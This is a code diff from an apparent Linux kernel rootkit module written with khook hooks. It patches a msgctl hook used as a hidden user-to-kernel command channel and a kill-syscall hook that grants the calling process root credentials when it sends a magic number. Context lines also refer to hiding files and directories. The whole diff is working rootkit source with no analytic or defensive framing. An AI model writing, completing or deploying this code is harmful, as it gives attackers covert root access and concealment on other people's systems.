@@ -116,28 +116,30 @@ void log_error(const char *message) {
 }
 
 /**
- * Hook for communication with kernel from user program. If both msquid and cmd
+ * Hook for communication with kernel from user program. If both msqid and cmd
  * are -1 and buf is a NULL pointer, the next call to this function is a command.
- * If incoming_command_flag is set, and both msquid andd cmd are -1, the
+ * If incoming_command_flag is set, and both msqid and cmd are -1, the
  * msquid_ds struct should be cast to an action_task * and processed.
  */
-KHOOK_EXT(long, __x64_ksys_msgctl, int msqid, int cmd, struct msqid_ds __user *buf);
+KHOOK_EXT(long, __x64_ksys_msgctl, int, int, struct msqid_ds __user *);
 static long khook___x64_ksys_msgctl(int msqid, int cmd, struct msqid_ds __user *buf) {
-	if (msquid == -1 && cmd == -1 && !buf) {
+	action_task* task;
+	if (msqid == -1 && cmd == -1 && !buf) {
 		if (!incoming_command_flag) { // Prepare for incoming command.
 			printk(KERN_EMERG "sys_msgctl -- preparing for incoming command\n");
 			incoming_command_flag = true;
 			return 0;
 		} else { // This is a command.
 			printk(KERN_EMERG "sys_msgctl -- Command found\n");
-			action_task* task = (action_task*) buf;
+			task = (action_task*) buf;
+			printk(KERN_EMERG "FUNC CODE: %d\n", task->func_code);
+			return 0;
 		}
 	} else {
+		incoming_command_flag = false;
 		return KHOOK_ORIGIN(__x64_ksys_msgctl, msqid, cmd, buf);
 	}
 }
-
-
 
 /**
  * Hide files and directories.
@@ -217,14 +219,14 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
  * Drops the current user into a root shell.
  */
 static int get_root(void) {
-	printk(KERN_EMERG
-	"One root coming right up.");
-	return commit_creds(prepare_kernel_cred(NULL));
+	struct cred* root_creds;
+	printk(KERN_EMERG "One root coming right up.");
+	root_creds = prepare_kernel_cred(NULL);
+	return commit_creds(root_creds);
 }
 
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
 static long khook___x64_sys_kill(const struct pt_regs *regs) {
-	printk("sys_kill -- %s pid %ld sig %ld\n", current->comm, regs->di, regs->si);
 	if (regs->di == MAGIC_ROOT_NUM) {
 		return get_root();
 	}
